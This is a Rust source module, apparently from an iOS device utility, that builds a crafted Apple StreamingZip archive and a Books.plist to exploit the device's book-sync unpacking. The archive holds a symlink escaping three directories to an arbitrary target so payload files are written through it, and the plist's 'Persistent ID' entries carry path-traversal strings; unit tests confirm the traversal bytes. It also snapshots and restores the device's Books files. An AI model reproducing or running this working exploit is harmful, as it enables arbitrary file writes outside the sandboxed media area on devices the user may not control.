//! Crafted archive / Books.plist builders, and the Books snapshot/restore
//! safety net.
//!
//! Ported from `reference/AirCard-Windows/src/airlift.rs`. The builders are pure
//! byte manipulation and are reproduced exactly — the exploit depends on the
//! precise StreamingZip layout (Apple's `0x5A53` extra field carrying the Unix
//! mode, stored/uncompressed entries, symlink entry).
//!
//! See `docs/airtraffic-protocol.md` §5.6.

use std::collections::HashMap;

use anyhow::{Context, Result, bail};
use plist::{Dictionary, Value};

use crate::afc::Afc;

pub const SOURCE_PREFIX: &str = "airlift-src-";
pub const LINK_PREFIX: &str = "airlift-link-";
pub const RECOVERED_PREFIX: &str = "airlift-recovered-";

/// Books state we snapshot before touching anything, and restore afterwards.
pub const TRACKED_BOOKS_FILES: &[&str] = &[
    "Books/Books.plist",
    "Books/Sync/Books.plist",
    "Books/Sync/Upload.plist",
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
];

/// Apple StreamingZip's Unix-mode extra field id.
const SZ_EXTRA_ID: u16 = 0x5A53;

const S_IFDIR: u32 = 0o040000;
const S_IFREG: u32 = 0o100000;
const S_IFLNK: u32 = 0o120000;

struct StoredZipEntry {
    name: String,
    mode: u32,
    data: Vec<u8>,
}

fn crc32(data: &[u8]) -> u32 {
    let mut crc = 0xFFFF_FFFFu32;
    for &b in data {
        crc ^= b as u32;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB8_8320;
            } else {
                crc >>= 1;
            }
        }
    }
    !crc
}

/// Single-payload archive, matching the reference's `build_streaming_zip_archive`.
pub fn build_streaming_zip_archive(target: &str, payload: &[u8]) -> Result<Vec<u8>> {
    build_streaming_zip_archive_multi(target, &[("payload", payload)])
}

/// Build the crafted StreamingZip that ATAirlock will unpack.
///
/// `target` is the directory the symlink escapes to; `items` are the payload
/// files that will be written through it.
pub fn build_streaming_zip_archive_multi(
    target: &str,
    items: &[(&str, &[u8])],
) -> Result<Vec<u8>> {
    let target_tail = target.strip_prefix('/').unwrap_or(target);

    let mut metadata = Dictionary::new();
    metadata.insert("Version".into(), Value::Integer(2.into()));
    let mut metadata_plist = Vec::new();
    plist::to_writer_binary(&mut metadata_plist, &Value::Dictionary(metadata))
        .context("encoding ZipMetadata.plist")?;

    let mut entries: Vec<StoredZipEntry> = Vec::new();

    entries.push(StoredZipEntry {
        name: "META-INF/".into(),
        mode: S_IFDIR | 0o755,
        data: Vec::new(),
    });
    entries.push(StoredZipEntry {
        name: "META-INF/com.apple.ZipMetadata.plist".into(),
        mode: S_IFREG | 0o600,
        data: metadata_plist,
    });
    for dir in ["p0/", "p0/p1/", "p0/p1/p2/"] {
        entries.push(StoredZipEntry {
            name: dir.into(),
            mode: S_IFDIR | 0o755,
            data: Vec::new(),
        });
    }

    // The escape: `../../../<target_tail>` resolved from within Media.
    entries.push(StoredZipEntry {
        name: "p0/p1/p2/link".into(),
        mode: S_IFLNK | 0o777,
        data: format!("../../../{target_tail}").into_bytes(),
    });

    // Intermediate directories of the target so the symlink resolves.
    let mut cursor = String::new();
    for component in target_tail.split('/') {
        if component.is_empty() {
            continue;
        }
        cursor.push_str(component);
        cursor.push('/');
        entries.push(StoredZipEntry {
            name: cursor.clone(),
            mode: S_IFDIR | 0o755,
            data: Vec::new(),
        });
    }

    if items.len() == 1 && items[0].0 == "payload" {
        entries.push(StoredZipEntry {
            name: "payload".into(),
            mode: S_IFREG | 0o600,
            data: items[0].1.to_vec(),
        });
    } else {
        for (idx, (_leaf, payload)) in items.iter().enumerate() {
            entries.push(StoredZipEntry {
                name: format!("payload_{idx}"),
                mode: S_IFREG | 0o600,
                data: payload.to_vec(),
            });
        }
        if !items.is_empty() {
            entries.push(StoredZipEntry {
                name: "payload".into(),
                mode: S_IFREG | 0o600,
                data: items[0].1.to_vec(),
            });
        }
    }

    pack_stored_zip(&entries)
}

fn pack_stored_zip(entries: &[StoredZipEntry]) -> Result<Vec<u8>> {
    let mut out: Vec<u8> = Vec::new();
    let mut central: Vec<(String, u32, u32, u32, u32, Vec<u8>)> = Vec::new();

    for entry in entries {
        let offset = out.len() as u32;
        let crc = crc32(&entry.data);
        let name = entry.name.as_bytes();
        let name_len = name.len() as u16;

        let mut extra = Vec::new();
        extra.extend_from_slice(&SZ_EXTRA_ID.to_le_bytes());
        extra.extend_from_slice(&2u16.to_le_bytes());
        extra.extend_from_slice(&((entry.mode & 0xFFFF) as u16).to_le_bytes());
        let extra_len = extra.len() as u16;

        out.extend_from_slice(&0x0403_4b50u32.to_le_bytes()); // local header
        out.extend_from_slice(&20u16.to_le_bytes()); // version needed
        out.extend_from_slice(&0u16.to_le_bytes()); // flags
        out.extend_from_slice(&0u16.to_le_bytes()); // stored
        out.extend_from_slice(&0x2800u16.to_le_bytes()); // mod time
        out.extend_from_slice(&0x5D30u16.to_le_bytes()); // mod date
        out.extend_from_slice(&crc.to_le_bytes());
        out.extend_from_slice(&(entry.data.len() as u32).to_le_bytes());
        out.extend_from_slice(&(entry.data.len() as u32).to_le_bytes());
        out.extend_from_slice(&name_len.to_le_bytes());
        out.extend_from_slice(&extra_len.to_le_bytes());
        out.extend_from_slice(name);
        out.extend_from_slice(&extra);
        out.extend_from_slice(&entry.data);

        central.push((
            entry.name.clone(),
            entry.mode,
            crc,
            entry.data.len() as u32,
            offset,
            extra,
        ));
    }

    let cd_start = out.len() as u32;
    for (name, mode, crc, len, offset, extra) in &central {
        let name = name.as_bytes();
        let extra_len = extra.len() as u16;
        let external_attr = (mode & 0xFFFF) << 16;

        out.extend_from_slice(&0x0201_4b50u32.to_le_bytes()); // central header
        out.extend_from_slice(&((3u16 << 8) | 20).to_le_bytes()); // made by Unix
        out.extend_from_slice(&20u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0x2800u16.to_le_bytes());
        out.extend_from_slice(&0x5D30u16.to_le_bytes());
        out.extend_from_slice(&crc.to_le_bytes());
        out.extend_from_slice(&len.to_le_bytes());
        out.extend_from_slice(&len.to_le_bytes());
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        out.extend_from_slice(&extra_len.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes()); // comment len
        out.extend_from_slice(&0u16.to_le_bytes()); // disk start
        out.extend_from_slice(&0u16.to_le_bytes()); // internal attrs
        out.extend_from_slice(&external_attr.to_le_bytes());
        out.extend_from_slice(&offset.to_le_bytes());
        out.extend_from_slice(name);
        out.extend_from_slice(extra);
    }

    let cd_len = (out.len() as u32) - cd_start;
    let count = central.len() as u16;

    out.extend_from_slice(&0x0605_4b50u32.to_le_bytes()); // EOCD
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&count.to_le_bytes());
    out.extend_from_slice(&count.to_le_bytes());
    out.extend_from_slice(&cd_len.to_le_bytes());
    out.extend_from_slice(&cd_start.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes()); // comment len
    Ok(out)
}

/// Books.plist declaring each identifier as a "Persistent ID".
///
/// These are what the device turns into downloadable assets — and their
/// traversal components are the exploit. See `docs/airtraffic-protocol.md` §5.6.
pub fn build_books_plist(identifiers: &[String]) -> Result<Vec<u8>> {
    let mut rows = Vec::new();
    for (idx, ident) in identifiers.iter().enumerate() {
        let mut row = Dictionary::new();
        row.insert("Persistent ID".into(), Value::String(ident.clone()));
        row.insert("Item ID".into(), Value::String((idx + 1).to_string()));
        row.insert("DSID".into(), Value::String("1".into()));
        rows.push(Value::Dictionary(row));
    }

    let mut root = Dictionary::new();
    root.insert("Books".into(), Value::Array(rows));

    let mut buf = Vec::new();
    plist::to_writer_binary(&mut buf, &Value::Dictionary(root))
        .context("encoding Books.plist")?;
    Ok(buf)
}

/// Which of `TRACKED_BOOKS_FILES` existed, and their contents.
pub struct BooksSnapshot {
    pub files: HashMap<String, Option<Vec<u8>>>,
}

impl BooksSnapshot {
    pub fn existed(&self, path: &str) -> bool {
        matches!(self.files.get(path), Some(Some(_)))
    }
}

pub async fn snapshot_books(afc: &mut Afc) -> Result<BooksSnapshot> {
    let mut files = HashMap::new();
    for &path in TRACKED_BOOKS_FILES {
        let key = format!("/{path}");
        if afc.exists(&key).await {
            let data = afc
                .read_file(&key)
                .await
                .with_context(|| format!("snapshotting {path}"))?;
            files.insert(path.to_string(), Some(data));
        } else {
            files.insert(path.to_string(), None);
        }
    }
    Ok(BooksSnapshot { files })
}

/// Put the device's Books state back the way we found it.
pub async fn restore_books(afc: &mut Afc, snapshot: &BooksSnapshot) -> Result<()> {
    let mut errors = Vec::new();
    for (path, data) in &snapshot.files {
        let key = format!("/{path}");
        let result = match data {
            Some(bytes) => {
                if let Some(parent) = path.rfind('/').map(|i| &path[..i]) {
                    let _ = afc.make_directory_recursive(&format!("/{parent}")).await;
                }
                afc.write_file(&key, bytes).await
            }
            None => afc.remove_path(&key).await,
        };
        if let Err(e) = result {
            errors.push(format!("{path}: {e}"));
        }
    }
    if !errors.is_empty() {
        bail!("Books restore had errors: {}", errors.join("; "));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn archive_has_expected_signatures() {
        let archive =
            build_streaming_zip_archive("/var/tmp", b"hello").expect("build archive");
        assert_eq!(&archive[0..4], &[0x50, 0x4b, 0x03, 0x04], "local header magic");
        assert!(
            archive.windows(2).any(|w| w == [0x53, 0x5a]),
            "must contain the 0x5A53 StreamingZip extra field"
        );
        assert!(
            archive.windows(4).any(|w| w == [0x50, 0x4b, 0x05, 0x06]),
            "must contain an EOCD record"
        );
    }

    #[test]
    fn archive_symlink_escapes_to_target() {
        let archive =
            build_streaming_zip_archive("/var/tmp", b"x").expect("build archive");
        let needle = b"../../../var/tmp";
        assert!(
            archive.windows(needle.len()).any(|w| w == needle),
            "symlink payload must escape three levels to the target"
        );
    }

    #[test]
    fn books_plist_round_trips() {
        let ids = vec![
            "../../airlift-src-tok/p0/p1/p2/link".to_string(),
            "../../airlift-src-tok/payload".to_string(),
        ];
        let bytes = build_books_plist(&ids).expect("build books plist");
        let value = Value::from_reader(std::io::Cursor::new(&bytes)).expect("parse");
        let books = value
            .as_dictionary()
            .and_then(|d| d.get("Books"))
            .and_then(Value::as_array)
            .expect("Books array");
        assert_eq!(books.len(), 2);
        let first = books[0]
            .as_dictionary()
            .and_then(|d| d.get("Persistent ID"))
            .and_then(Value::as_string);
        assert_eq!(first, Some(ids[0].as_str()));
    }

    #[test]
    fn single_payload_uses_plain_name() {
        let archive =
            build_streaming_zip_archive("/var/tmp", b"x").expect("build archive");
        assert!(
            archive.windows(7).any(|w| w == b"payload"),
            "single-payload archive names the entry `payload`"
        );
    }
}
